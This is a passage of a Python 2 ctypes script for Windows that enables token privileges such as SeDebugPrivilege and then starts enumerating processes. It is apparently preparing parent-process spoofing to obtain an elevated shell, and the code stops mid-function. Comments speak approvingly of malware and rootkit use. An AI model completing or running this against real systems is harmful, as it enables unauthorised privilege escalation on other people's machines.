import enum, os, sys
# https://twitter.com/highsenburger69/status/935549594053857280
from ctypes.wintypes import *
from ctypes import *
# These libraries have the APIs we need
kernel32 = WinDLL('kernel32', use_last_error=True)
advapi32 = WinDLL('advapi32', use_last_error=True)
shell32  = WinDLL('shell32', use_last_error=True)
psapi    = WinDLL('psapi.dll', use_last_error=True)

# Define structures

# An LUID is a 64-bit value guaranteed to be unique only on the system on which it was generated
                                                                # https://msdn.microsoft.com/en-us/library/windows/desktop/aa379261(v=vs.85).aspx
class LUID(Structure):                                         # typedef struct _LUID
     _fields_ = [				               # {
		 ('LowPart', DWORD),                           # DWORD LowPart;
                 ('HighPart', LONG)                            # LONG  HighPart;
	        ]			                       # }

# The LUID_AND_ATTRIBUTES structure represents a locally unique identifier (LUID) and its attributes.
                                                                # https://msdn.microsoft.com/en-us/library/windows/desktop/aa379263(v=vs.85).aspx
class LUID_AND_ATTRIBUTES(Structure):                          # typedef struct _LUID_AND_ATTRIBUTES
     _fields_ = [                                              # {
		 ('Luid',      LUID), 	  	 	       # LUID  Luid;
                 ('Attributes',DWORD)			       # DWORD Attributes;
 	        ]					       # }

PSID = c_void_p
# The SID_AND_ATTRIBUTES structure represents a security identifier (SID) and its attributes. SIDs are used to uniquely identify users or groups
                                                                # https://msdn.microsoft.com/en-us/library/windows/desktop/aa379595(v=vs.85).aspx
class SID_AND_ATTRIBUTES(Structure):                           # typedef struct _SID_AND_ATTRIBUTES
    _fields_ = [                                               # {
                ('Sid',         PSID),                         # PSID  Sid;
                ('Attributes',  DWORD)                         # DWORD Attributes;
                ]                                              # }


# The TOKEN_PRIVILEGES structure contains information about a set of privileges for an access token.
							        # https://msdn.microsoft.com/en-us/library/windows/desktop/aa379630(v=vs.85).aspx
class TOKEN_PRIVILEGES(Structure):      		       # typedef struct _TOKEN_PRIVILEGES
     _fields_ = [                                              # {
		 ('PrivilegeCount',  DWORD),		       # DWORD               PrivilegeCount;
                 ('Privileges',      LUID_AND_ATTRIBUTES * 512)# LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];
	        ]			                       # }

                                                                # https://docs.python.org/3/library/ctypes.html#specifying-the-required-argument-types-function-prototypes
class c_enum(enum.IntEnum):                                    # A ctypes-compatible IntEnum superclass that implements the class method
    @classmethod                                               # https://docs.python.org/3/library/functions.html#classmethod
    def from_param(cls, obj):                                  # Define the class method `from_param`.
        return c_int(cls(obj))                                 # The obj argument to the from_param method is the object instance, in this case the enumerated value itself. Any Enum with an integer value can be directly cast to int. TokenElevation -> TOKEN_INFORMATION_CLASS.TokenElevation

#  The TOKEN_INFORMATION_CLASS enumeration contains values that specify the type of information being assigned to or retrieved from an access token
                                                                # https://msdn.microsoft.com/en-us/library/windows/desktop/aa379626(v=vs.85).aspx
class TOKEN_INFORMATION_CLASS(c_enum):                         # typedef enum _TOKEN_INFORMATION_CLASS {
#spoilers    TokenUser       = 1                               # TokenUser       The buffer receives a TOKEN_USER structure that contains the user account of the token
#spoilers    TokenGroups     = 2                               # TokenGroups     The buffer receives a TOKEN_GROUPS structure that contains the group accounts associated with the token
#spoilers    TokenPrivileges = 3                               # TokenPrivileges The buffer receives a TOKEN_PRIVILEGES structure that contains the privileges of the token
     TokenElevation = 20                                       # TokenElevationType The buffer receives a TOKEN_ELEVATION_TYPE value that specifies the elevation level of the token.


# DWORD_PTR = POINTER(DWORD)
SIZE_T    = c_size_t
PVOID     = c_void_p
# This structure stores the value for each attribute
                                                                # http://www.rohitab.com/discuss/topic/38601-proc-thread-attribute-list-structure-documentation/
class PROC_THREAD_ATTRIBUTE_ENTRY(Structure):                  # typedef struct _PROC_THREAD_ATTRIBUTE_ENTRY
    _fields_ = [                                               # {
                ("Attribute",     DWORD),                      # DWORD_PTR   Attribute;  // PROC_THREAD_ATTRIBUTE_xxx # https://msdn.microsoft.com/en-us/library/windows/desktop/ms686880(v=vs.85).aspx
                ("cbSize",       SIZE_T),                      # SIZE_T      cbSize;
                ("lpValue",       PVOID)                       # PVOID       lpValue
                ]                                              # }

PULONG = POINTER(ULONG)
# This structure contains a list of attributes that have been added using UpdateProcThreadAttribute
                                                                # http://www.rohitab.com/discuss/topic/38601-proc-thread-attribute-list-structure-documentation/
class PROC_THREAD_ATTRIBUTE_LIST(Structure):                   # typedef struct _PROC_THREAD_ATTRIBUTE_LIST
    _fields_ = [                                               # {
                ("dwFlags", DWORD),                            # DWORD                      dwFlags;
                ("Size",    ULONG),                            # ULONG                      Size;
                ("Count",   ULONG),                            # ULONG                      Count;
                ("Reserved",ULONG),                            # ULONG                      Reserved;
                ("Unknown", PULONG),                           # PULONG                     Unkown;
                ("Entries", PROC_THREAD_ATTRIBUTE_ENTRY * 1)   # PROC_THREAD_ATTRIBUTE_LIST Entries[ANYSIZE_ARRAY]
                ]                                              # }

LPVOID = PVOID
LPTSTR = c_void_p
LPBYTE = c_char_p
# Specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.
                                                                # https://msdn.microsoft.com/en-us/library/windows/desktop/ms686331(v=vs.85).aspx
class STARTUPINFO(Structure):                                  # typedef struct _STARTUPINFO
    _fields_ = [                                               # {
                ('cb',               DWORD),                   # DWORD  cb;
                ('lpReserved',       LPTSTR),                  # LPTSTR lpReserved;
                ('lpDesktop',        LPTSTR),                  # LPTSTR lpDesktop;
                ('lpTitle',          LPTSTR),                  # LPTSTR lpTitle;
                ('dwX',              DWORD),                   # DWORD  dwX;
                ('dwY',              DWORD),                   # DWORD  dwY;
                ('dwXSize',          DWORD),                   # DWORD  dwXSize;
                ('dwYSize',          DWORD),                   # DWORD  dwYSize;
                ('dwXCountChars',    DWORD),                   # DWORD  dwXCountChars;
                ('dwYCountChars',    DWORD),                   # DWORD  dwYCountChars;
                ('dwFillAttribute',  DWORD),                   # DWORD  dwFillAttribute;
                ('dwFlags',          DWORD),                   # DWORD  dwFlags;
                ('wShowWindow',       WORD),                   # WORD   wShowWindow;
                ('cbReserved2',       WORD),                   # WORD   cbReserved2;
                ('lpReserved2',     LPBYTE),                   # LPBYTE lpReserved2;
                ('hStdInput',       HANDLE),                   # HANDLE hStdInput;
                ('hStdOutput',      HANDLE),                   # HANDLE hStdOutput;
                ('hStdError',       HANDLE)                    # HANDLE hStdError;
                ]                                              # }

PPROC_THREAD_ATTRIBUTE_LIST = POINTER(PROC_THREAD_ATTRIBUTE_LIST)
# Specifies the window station, desktop, standard handles, and attributes for a new process. It is used with the CreateProcess and CreateProcessAsUser functionsself.
                                                                # https://msdn.microsoft.com/en-us/library/windows/desktop/ms686329(v=vs.85).aspx
class STARTUPINFOEX(Structure):                                #   typedef struct _STARTUPINFOEX
    _fields_ = [                                               #   {
                ('StartupInfo',     STARTUPINFO),              #   STARTUPINFO                 StartupInfo;
                ('lpAttributeList', LPVOID),                   # PPROC_THREAD_ATTRIBUTE_LIST lpAttributeList; # lpStartupInfo = STARTUPINFOEX(); lpStartupInfo.lpAttributeList = addressof(AttributeList)
                ]                                              # }

# Contains information about a newly created process and its primary thread. It is used with the CreateProcess, CreateProcessAsUser, CreateProcessWithLogonW, or CreateProcessWithTokenW function.
                                                                # https://msdn.microsoft.com/en-us/library/windows/desktop/ms684873(v=vs.85).aspx
class PROCESS_INFORMATION(Structure):                          # typedef struct _PROCESS_INFORMATION
    _fields_ = [                                               # {
                ("hProcess",    HANDLE),                       # HANDLE hProcess;
                ("hThread",     HANDLE),                       # HANDLE hThread;
                ("dwProcessId",  DWORD),                       # DWORD  dwProcessId;
                ("dwThreadId",   DWORD)                        # DWORD  dwThreadId;
                ]                                              # }


# Privilege constants                                                  # https://msdn.microsoft.com/en-us/library/windows/desktop/bb530716(v=vs.85).aspx
SE_ASSIGNPRIMARYTOKEN_NAME     = "SeAssignPrimaryTokenPrivilege"    # Replace a process-level token
SE_AUDIT_NAME                  = "SeAuditPrivilege"                 # Generate security audits
SE_BACKUP_NAME                 = "SeBackupPrivilege"                # Back up files and directories
SE_CHANGE_NOTIFY_NAME          = "SeChangeNotifyPrivilege"	        # Bypass traverse checking
SE_CREATE_GLOBAL_NAME          = "SeCreateGlobalPrivilege"          # Create global objects
SE_CREATE_PAGEFILE_NAME        = "SeCreatePagefilePrivilege"        # Create a pagefile
SE_CREATE_PERMANENT_NAME       = "SeCreatePermanentPrivilege"       # Create permanent shared objects
SE_CREATE_SYMBOLIC_LINK_NAME   = "SeCreateSymbolicLinkPrivilege"    # Create symbolic links
SE_CREATE_TOKEN_NAME           = "SeCreateTokenPrivilege"           # Create a token object
SE_DEBUG_NAME                  = "SeDebugPrivilege"                 # Debug programs | * Malwares <3 this one *
SE_ENABLE_DELEGATION_NAME      = "SeEnableDelegationPrivilege"      # Enable computer and user accounts to be trusted for delegation
SE_IMPERSONATE_NAME            = "SeImpersonatePrivilege"           # Impersonate a client after authentication
SE_INC_BASE_PRIORITY_NAME      = "SeIncreaseBasePriorityPrivilege"  # Increase scheduling priority
SE_INCREASE_QUOTA_NAME         = "SeIncreaseQuotaPrivilege"         # Adjust memory quotas for a process
SE_INC_WORKING_SET_NAME        = "SeIncreaseWorkingSetPrivilege"    # Increase a process working set
SE_LOAD_DRIVER_NAME            = "SeLoadDriverPrivilege"            # Load and unload device drivers | DKOM, rootkits, EPROCESS for process hiding
SE_LOCK_MEMORY_NAME            = "SeLockMemoryPrivilege"            # Lock pages in memory
SE_MACHINE_ACCOUNT_NAME        = "SeMachineAccountPrivilege"        # Add workstations to domain
SE_MANAGE_VOLUME_NAME          = "SeManageVolumePrivilege"          # Manage the files on a volume
SE_PROF_SINGLE_PROCESS_NAME    = "SeProfileSingleProcessPrivilege"  # Profile single process
SE_RELABEL_NAME                = "SeRelabelPrivilege"               # Modify an object label
SE_REMOTE_SHUTDOWN_NAME        = "SeRemoteShutdownPrivilege"        # Force shutdown from a remote system
SE_RESTORE_NAME                = "SeRestorePrivilege"               # Restore files and directories
SE_SECURITY_NAME               = "SeSecurityPrivilege"              # Manage auditing and security log
SE_SHUTDOWN_NAME               = "SeShutdownPrivilege"              # Shut down the system
SE_SYNC_AGENT_NAME             = "SeSyncAgentPrivilege"             # Synchronize directory service data
SE_SYSTEM_ENVIRONMENT_NAME     = "SeSystemEnvironmentPrivilege"     # Modify firmware environment values
SE_SYSTEM_PROFILE_NAME         = "SeSystemProfilePrivilege"         # Profile system performance
SE_SYSTEMTIME_NAME             = "SeSystemtimePrivilege"            # Change the system time
SE_TAKE_OWNERSHIP_NAME         = "SeTakeOwnershipPrivilege"         # Take ownership of files or other objects
SE_TCB_NAME                    = "SeTcbPrivilege"                   # Act as part of the operating system
SE_TIME_ZONE_NAME              = "SeTimeZonePrivilege"              # Change the time zone
SE_TRUSTED_CREDMAN_ACCESS_NAME = "SeTrustedCredManAccessPrivilege"  # Access Credential Manager as a trusted caller
SE_UNDOCK_NAME                 = "SeUndockPrivilege"                # Remove computer from docking station
SE_UNSOLICITED_INPUT_NAME      = "SeUnsolicitedInputPrivilege"      # "Required to read unsolicited input from a terminal device"



# A pointer to a TOKEN_PRIVILEGES structure that specifies an array of privileges and their attributes.
# NewState [in, optional]                       #  https://msdn.microsoft.com/en-us/library/windows/desktop/aa375202(v=vs.85).aspx
SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001
SE_PRIVILEGE_ENABLED            = 0x00000002   # The function enables the privilege
SE_PRIVILEGE_REMOVED            = 0x00000004   # The privilege is removed from the list of privileges in the token. The other privileges in the list are reordered to remain contiguous.
SE_PRIVILEGE_USED_FOR_ACCESS 	= 0x80000000

# Standard access rights | https://msdn.microsoft.com/en-us/library/windows/desktop/aa379607(v=vs.85).aspx
SYNCHRONIZE                     = 0x00100000L  # The right to use the object for synchronization. This enables a thread to wait until the object is in the signaled state.


# Token access rights | https://msdn.microsoft.com/en-us/library/windows/desktop/aa374905(v=vs.85).aspx
TOKEN_ADJUST_PRIVILEGES         = 0x00000020   # Required to enable or disable the privileges in an access token
TOKEN_QUERY                     = 0x00000008   # Required to query an access token

# Process access rights for OpenProcess # https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880(v=vs.85).aspx
PROCESS_CREATE_PROCESS              = 0x0080 # Required to create a process.
PROCESS_CREATE_THREAD               = 0x0002 # Required to create a thread.
PROCESS_DUP_HANDLE                  = 0x0040 # Required to duplicate a handle using DuplicateHandle.
PROCESS_QUERY_INFORMATION           = 0x0400 # Required to retrieve certain information about a process, such as its token, exit code, and priority class = see OpenProcessToken #.
PROCESS_QUERY_LIMITED_INFORMATION   = 0x1000 # Required to retrieve certain information about a process = see GetExitCodeProcess, GetPriorityClass, IsProcessInJob, QueryFullProcessImageName #. A handle that has the PROCESS_QUERY_INFORMATION access right is automatically granted PROCESS_QUERY_LIMITED_INFORMATION.  Windows Server 2003 and Windows XP:  This access right is not supported.
PROCESS_SET_INFORMATION             = 0x0200 # Required to set certain information about a process, such as its priority class = see SetPriorityClass #.
PROCESS_SET_QUOTA                   = 0x0100 # Required to set memory limits using SetProcessWorkingSetSize.
PROCESS_SUSPEND_RESUME              = 0x0800 # Required to suspend or resume a process.
PROCESS_TERMINATE                   = 0x0001 # Required to terminate a process using TerminateProcess.
PROCESS_VM_OPERATION                = 0x0008 # Required to perform an operation on the address space of a process = see VirtualProtectEx and WriteProcessMemory #.
PROCESS_VM_READ                     = 0x0010 # Required to read memory in a process using ReadProcessMemory.
PROCESS_VM_WRITE                    = 0x0020 # Required to write to memory in a process using WriteProcessMemory.
PROCESS_ALL_ACCESS = (PROCESS_CREATE_PROCESS | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_SET_INFORMATION | PROCESS_SET_QUOTA | PROCESS_SUSPEND_RESUME | PROCESS_TERMINATE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | SYNCHRONIZE)

# Process creation flags | https://msdn.microsoft.com/en-us/library/windows/desktop/ms684863(v=vs.85).aspx
CREATE_NEW_CONSOLE              = 0x00000010 # The new process has a new console, instead of inheriting its parent's console (the default).
EXTENDED_STARTUPINFO_PRESENT    = 0x00080000 # The process is created with extended startup information; the lpStartupInfo parameter specifies a STARTUPINFOEX structure.

# UpdateProcThreadAttribute attributes | Specify privileged parent process
ProcThreadAttributeParentProcess= 0
PROC_THREAD_ATTRIBUTE_INPUT     = 0x00020000                                                          # Attribute is input only
PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = ProcThreadAttributeParentProcess | PROC_THREAD_ATTRIBUTE_INPUT # Handle of the Parent Process

# Win32 API function definitions
                                                                                    # https://msdn.microsoft.com/en-us/library/windows/desktop/ff818516(v=vs.85).aspx

#Retrieves the calling thread's last-error code value. The last-error code is maintained on a per-thread basis. Multiple threads do not overwrite each other's last-error code.
GetLastError = windll.kernel32.GetLastError                                         # https://msdn.microsoft.com/en-us/library/windows/desktop/ms679360(v=vs.85).aspx
GetLastError.restype = DWORD                                                       # DWORD WINAPI GetLastError(void);

# Retrieves a pseudo handle for the current process
GetCurrentProcess = kernel32.GetCurrentProcess                                      # https://msdn.microsoft.com/en-us/library/windows/desktop/ms683179(v=vs.85).aspx
GetCurrentProcess.restype = HANDLE                                                 # HANDLE WINAPI GetCurrentProcess(void);

#  The OpenProcessToken function opens the access token associated with a process
OpenProcessToken = advapi32.OpenProcessToken                                        # https://msdn.microsoft.com/en-us/library/windows/desktop/aa379295(v=vs.85).aspx
OpenProcessToken.restype = BOOL                                                    # BOOL WINAPI OpenProcessToken(
OpenProcessToken.argtypes = [			                                   # (
			     HANDLE,                                               # HANDLE  ProcessHandle,
			     DWORD,                                                # DWORD   DesiredAccess,
			     POINTER(HANDLE)	                                   # PHANDLE TokenHandle
			    ]		                                           # );

PDWORD = POINTER(DWORD)
# The GetTokenInformation function retrieves a specified type of information about an access token.
GetTokenInformation = advapi32.GetTokenInformation                                  # https://msdn.microsoft.com/en-us/library/windows/desktop/aa446671(v=vs.85).aspx
GetTokenInformation.restype =  BOOL                                                # BOOL WINAPI GetTokenInformation
GetTokenInformation.argtypes = [                                                   # (
                HANDLE,                                                            # HANDLE                  TokenHandle,
                c_int,                                                             # TOKEN_INFORMATION_CLASS TokenInformationClass, (TOKEN_INFORMATION_CLASS.enum (eg: TokenElevation) -> cast to int (0x14))
                LPVOID,                                                            # LPVOID                  TokenInformation,
                DWORD,                                                             # DWORD                   TokenInformationLength,
                PDWORD                                                             # PDWORD                  ReturnLength
                ]                                                                  # )

# The LookupPrivilegeValue function retrieves the locally unique identifier (LUID) used on a specified system to locally represent the specified privilege name
LookupPrivilegeValue = advapi32.LookupPrivilegeValueW                               # https://msdn.microsoft.com/en-us/library/windows/desktop/aa379180(v=vs.85).aspx Unicode version
LookupPrivilegeValue.restype = BOOL                                                # BOOL WINAPI LookupPrivilegeValue
LookupPrivilegeValue.argtypes = [                                                  # (
				 LPWSTR,                                           # LPCTSTR lpSystemName,              # LPWSTR ->	 https://msdn.microsoft.com/en-us/library/cc230355.aspx
				 LPWSTR,                                           # LPCTSTR lpName,                    # LPWSTR ->	 https://msdn.microsoft.com/en-us/library/cc230355.aspx
				 POINTER(LUID)                                     # PLUID   lpLuid
				]		                                   # );


PTOKEN_PRIVILEGES = POINTER(TOKEN_PRIVILEGES)
# The AdjustTokenPrivileges function enables or disables privileges in the specified access token
# Enabling or disabling privileges in an access token requires TOKEN_ADJUST_PRIVILEGES access -> PTOKEN_PRIVILEGES = POINTER(TOKEN_PRIVILEGES)
AdjustTokenPrivileges = advapi32.AdjustTokenPrivileges                              # https://msdn.microsoft.com/en-us/library/windows/desktop/aa375202(v=vs.85).aspx
AdjustTokenPrivileges.restype = BOOL                                               # BOOL WINAPI AdjustTokenPrivileges
AdjustTokenPrivileges.argtypes = [                                                 # {
                HANDLE,	                                                           #   
		BOOL,                                                              # BOOL              DisableAllPrivileges,
		PTOKEN_PRIVILEGES,                                                 # PTOKEN_PRIVILEGES NewState,           # SE_PRIVILEGE_ENABLED = 0x00000002
		DWORD,	                                                           # DWORD             BufferLength,
		PTOKEN_PRIVILEGES,                                                 # PTOKEN_PRIVILEGES PreviousState,
	        POINTER(DWORD)                                                     # PDWORD            ReturnLength
			    ]		                                           # }
# Opens an existing local process object.
OpenProcess = windll.kernel32.OpenProcess                                           # https://msdn.microsoft.com/en-us/library/windows/desktop/ms684320(v=vs.85).aspx
OpenProcess.restype = HANDLE                                                       # HANDLE WINAPI OpenProcess
OpenProcess.argtypes = [                                                           # (
                    DWORD,                                                         # DWORD dwDesiredAccess,
                    BOOL,                                                          # BOOL  bInheritHandle,
                    DWORD                                                          # DWORD dwProcessId
                    ]

# Retrieves the process identifier for each process object in the system.
EnumProcesses = psapi.EnumProcesses                                                  # https://msdn.microsoft.com/en-us/library/windows/desktop/ms682629(v=vs.85).aspx
EnumProcesses.restype = BOOL                                                        # BOOL WINAPI EnumProcesses
EnumProcesses.argtypes = [                                                          # (
                    PDWORD,                                                         # DWORD *pProcessIds,
                    DWORD,                                                          # DWORD cb,
                    PDWORD                                                          # DWORD *pBytesReturned
                    ]                                                               # )

LPTSTR = c_char_p
# Retrieves the name of the executable file for the specified process.
GetProcessImageFileName = psapi.GetProcessImageFileNameA                              # https://msdn.microsoft.com/en-us/library/windows/desktop/ms683217(v=vs.85).aspx
GetProcessImageFileName.restype = DWORD                                              # DWORD WINAPI GetProcessImageFileName
GetProcessImageFileName.argtypes = [                                                 # (
                    HANDLE,                                                          # HANDLE hProcess,
                    LPTSTR,                                                          # LPTSTR lpImageFileName,
                    DWORD                                                            # DWORD  nSize
                    ]                                                                # )

LPPROC_THREAD_ATTRIBUTE_LIST = PPROC_THREAD_ATTRIBUTE_LIST
PSIZE_T = POINTER(SIZE_T)
# Initializes the specified list of attributes for process and thread creation.
InitializeProcThreadAttributeList = windll.kernel32.InitializeProcThreadAttributeList # https://msdn.microsoft.com/en-us/library/windows/desktop/ms683481(v=vs.85).aspx
InitializeProcThreadAttributeList.restype = BOOL                                     # BOOL WINAPI InitializeProcThreadAttributeList
InitializeProcThreadAttributeList.argtypes = [                                       # (
                   LPPROC_THREAD_ATTRIBUTE_LIST,                                     # LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
                   DWORD,                                                            # DWORD                        dwAttributeCount,
                   DWORD,                                                            # DWORD                        dwFlags,
                   PSIZE_T                                                           # PSIZE_T                      lpSize
                   ]                                                                 # )

# Updates the specified attribute in a list of attributes for process and thread creation.
UpdateProcThreadAttribute = windll.kernel32.UpdateProcThreadAttribute                 # https://msdn.microsoft.com/en-us/library/windows/deLPSECURITY_ATTRIBUTES lpProcessAttributes,sktop/ms686880(v=vs.85).aspx
UpdateProcThreadAttribute.restype = BOOL                                             # BOOL WINAPI UpdateProcThreadAttribute
UpdateProcThreadAttribute.argtypes = [                                               # (
                  LPPROC_THREAD_ATTRIBUTE_LIST,                                      # LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
                  DWORD,                                                             # DWORD                        dwFlags,
                  DWORD,                                                             # DWORD_PTR                    Attribute,
                  PVOID,                                                             # PVOID                        lpValue,
                  SIZE_T,                                                            # SIZE_T                       cbSize,
                  PVOID,                                                             # PVOID                        lpPreviousValue,
                  PSIZE_T                                                            # PSIZE_T                      lpReturnSize
                  ]                                                                  # )

LPSECURITY_ATTRIBUTES = LPVOID
# Creates a new process and its primary thread. The new process runs in the security context of the calling process.
CreateProcess = windll.Kernel32.CreateProcessW                                         # https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx
CreateProcess.restype = BOOL                                                          # BOOL WINAPI CreateProcess
CreateProcess.argtypes = [                                                            # (
                   LPCWSTR,                                                           # LPCTSTR               lpApplicationName,
                   LPWSTR,                                                            # LPTSTR                lpCommandLine,
                   LPSECURITY_ATTRIBUTES,                                             # LPSECURITY_ATTRIBUTES lpProcessAttributes,
                   LPSECURITY_ATTRIBUTES,                                             # LPSECURITY_ATTRIBUTES lpThreadAttributes,
                   BOOL,                                                              # BOOL                  bInheritHandles,
                   DWORD,                                                             # DWORD                 dwCreationFlags,
                   LPVOID,                                                            # LPVOID                lpEnvironment,
                   LPCWSTR,                                                           # LPCTSTR               lpCurrentDirectory,
                   POINTER(STARTUPINFOEX),                                            # LPSTARTUPINFO         lpStartupInfo,
                   POINTER(PROCESS_INFORMATION)                                       # LPPROCESS_INFORMATION lpProcessInformation
                  ]                                                                   # )

# Deletes the specified list of attributes for process and thread creation.
DeleteProcThreadAttributeList = windll.kernel32.DeleteProcThreadAttributeList          # https://msdn.microsoft.com/en-us/library/windows/desktop/ms682559(v=vs.85).aspx
DeleteProcThreadAttributeList.restype = None                                          # VOID WINAPI DeleteProcThreadAttributeList
DeleteProcThreadAttributeList.argtypes = [                                            # (
                   LPPROC_THREAD_ATTRIBUTE_LIST                                       # LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList
                   ]                                                                  # )

# Closes an open object handle.
CloseHandle = kernel32.CloseHandle                                                     # https://msdn.microsoft.com/en-us/library/windows/desktop/ms724211(v=vs.85).aspx
CloseHandle.restype = BOOL                                                            # BOOL WINAPI CloseHandle
CloseHandle.argtypes =  [                                                             # (
                    HANDLE                                                            # HANDLE hObject
                    ]                                                                 # )

def areAdminRightsEnabled():
    currentToken         = HANDLE()
    OpenProcessToken(
                                   GetCurrentProcess(),                   # _In_      ProcessHandle          A handle to the process whose access token is opened. The process must have the PROCESS_QUERY_INFORMATION access permission.
                                   TOKEN_QUERY,                           # _In_      DesiredAccess          Specifies an access mask that specifies the requested types of access to the access token. These requested access types are compared with the discretionary access control list (DACL) of the token to determine which accesses are granted or denied.
                                   byref(currentToken))                   # _Out_     TokenHandle            A pointer to a handle that identifies the newly opened access token when the function returns.
    try:
         TokenInformation = DWORD()
         ReturnLength     = DWORD()
         cracknak69 = GetTokenInformation(
                                   currentToken,                          # _In_      TokenHandle            A handle to an access token from which information is retrieved. If TokenInformationClass specifies TokenSource, the handle must have TOKEN_QUERY_SOURCE access. For all other TokenInformationClass values, the handle must have TOKEN_QUERY access.
                                   TOKEN_INFORMATION_CLASS.TokenElevation,# _In_      TokenInformationClass  Specifies a value from the TOKEN_INFORMATION_CLASS enumerated type to identify the type of information the function retrieves.
                                   byref(TokenInformation),               # _Out_opt_ TokenInformation       A pointer to a buffer the function fills with the requested information. The structure put into this buffer depends upon the type of information specified by the TokenInformationClass parameter.
                                   sizeof(TokenInformation),              # _In_      TokenInformationLength Specifies the size, in bytes, of the buffer pointed to by the TokenInformation parameter. If TokenInformation is NULL, this parameter must be zero.
                                   byref(ReturnLength))                   # _Out_     ReturnLength           A pointer to a variable that receives the number of bytes needed for the buffer pointed to by the TokenInformation parameter.
         if TokenInformation:
              print "\t[+] Process has elevated privileges.. continuing"
         return bool(TokenInformation)                                    #  NULL pointers have a False boolean value
    finally:
               CloseHandle(currentToken)                                  # _In_      hObject                A valid handle to an open object.

def grantprivilege(privilege):
	INVALID_HANDLE_VALUE = c_void_p(-1).value
	hToken = HANDLE(INVALID_HANDLE_VALUE)
	print "\t[*] Grabbing and modifying Current Process token"
	knackcrack = OpenProcessToken(
                                  GetCurrentProcess(),                     # _In_      ProcessHandle        A handle to the process whose access token is opened. The process must have the PROCESS_QUERY_INFORMATION access permission.
                                  (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), # _In_      DesiredAccess        Specifies an access mask that specifies the requested types of access to the access token. These requested access types are compared with the discretionary access control list (DACL) of the token to determine which accesses are granted or denied.
                                  byref(hToken))                           # _Out_     TokenHandle          A pointer to a handle that identifies the newly opened access token when the function returns.
	if knackcrack == 0:
     		raise RuntimeError("Couldn't get process token. Error in OpenProcessToken: %s"%GetLastError())

	print "\t[*] Locate LUID for specified privilege", privilege
	luid = LUID()
    # Lookup the specified privilege on local system, and receive it's Luid
	knackrack1 = LookupPrivilegeValue(
                                      None,                                # _In_opt_ lpSystemName         A pointer to a null-terminated string that specifies the name of the system on which the privilege name is retrieved. If a null string is specified, the function attempts to find the privilege name on the local system.
                                      privilege,                           # _In_     lpName               A pointer to a null-terminated string that specifies the name of the privilege, as defined in the Winnt.h header file. For example, this parameter could specify the constant, SE_SECURITY_NAME, or its corresponding string, "SeSecurityPrivilege".
                                      byref(luid))                         # _Out_    lpLuid               A pointer to a variable that receives the LUID by which the privilege is known on the system specified by the lpSystemName parameter.

	if knackrack1 == 0:
    		raise RuntimeError("Couldn't lookup privilege value. Error in LookupPrivilegeValue: %s" %GetLastError())

	print "\t[*] Modifying token structure to enable", privilege
	tp = TOKEN_PRIVILEGES()                                                # https://msdn.microsoft.com/en-us/library/windows/desktop/aa446619(v=vs.85).aspx
	tp.PrivilegeCount = 1
	tp.Privileges[0].Luid = luid
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

	knackcrack666 = AdjustTokenPrivileges(
                                          hToken,                          # _In_      TokenHandle          A handle to the access token that contains the privileges to be modified. The handle must have TOKEN_ADJUST_PRIVILEGES access to the token. If the PreviousState parameter is not NULL, the handle must also have TOKEN_QUERY access.
                                          False,                           # _In_      DisableAllPrivileges Specifies whether the function disables all of the token's privileges. If this value is TRUE, the function disables all privileges and ignores the NewState parameter. If it is FALSE, the function modifies privileges based on the information pointed to by the NewState parameter.
                                          byref(tp),                       # _In_opt_  NewState             A pointer to a TOKEN_PRIVILEGES structure that specifies an array of privileges and their attributes. If the DisableAllPrivileges parameter is FALSE, the AdjustTokenPrivileges function enables, disables, or removes these privileges for the token. If DisableAllPrivileges is TRUE, the function ignores this parameter.
                                          sizeof(tp),                      # _In_      BufferLength         Specifies the size, in bytes, of the buffer pointed to by the PreviousState parameter. This parameter can be zero if the PreviousState parameter is NULL.
                                          None,                            # _Out_opt_ PreviousState        A pointer to a buffer that the function fills with a TOKEN_PRIVILEGES structure that contains the previous state of any privileges that the function modifies. That is, if a privilege has been modified by this function, the privilege and its previous state are contained in the TOKEN_PRIVILEGES structure referenced by PreviousState. If the PrivilegeCount member of TOKEN_PRIVILEGES is zero, then no privileges have been changed by this function. This parameter can be NULL.
                                          None)                            # _Out_opt_ ReturnLength         A pointer to a variable that receives the required size, in bytes, of the buffer pointed to by the PreviousState parameter. This parameter can be NULL if PreviousState is NULL.
	if knackcrack666 == 0:
     		raise RunTimeError("Couldn't enabled or disable the privilege. Error in AdjustTokenPrivileges: %s" %GetLastError())
	print "\t[*] Adjusted privileges for the Current Process, enjoy <3, PID:", os.getpid()
	CloseHandle(hToken)                                                # _In_      hObject              A valid handle to an open object.

def get_script_dir(follow_symlinks=True):
    if getattr(sys, 'frozen', False):
        path = os.path.abspath(sys.executable)
        filename = os.path.basename(__file__)
        slash = "\\"
    else:
        path = inspect.getasbfile(get_script_dir)
        filename = os.path.basename(__file__)
        slash = "\\"
    return os.path.dirname(path)+slash+filename

def ntshell():
     while True:
          DWORD_array    = (DWORD *  0xffff)
          ProcessIds     = DWORD_array()
          ProcessIdsSize = sizeof(ProcessIds)
          BytesReturned  = DWORD()
          if EnumProcesses(
                           ProcessIds,                                   # _Out_     pProcessIds           A pointer to an array that receives the list of process identifiers.
                           ProcessIdsSize,                               # _In_      cb                    The size of the pProcessIds array, in bytes.
                           BytesReturned):                               # _Out_     pBytesReturned        The number of bytes returned in the pProcessIds array.
               if BytesReturned.value < ProcessIdsSize:
                 break

     for index in range(BytesReturned.value / sizeof(DWORD)):
         ProcessId = ProcessIds[index]
         hProcess = OpenProcess(
                           PROCESS_QUERY_LIMITED_INFORMATION,            # _In_      dwDesiredAccess       The access to the process object. This access right is checked against the security descriptor for the process. If the caller has enabled the SeDebugPrivilege privilege, the requested access is granted regardless of the contents of the security descriptor.
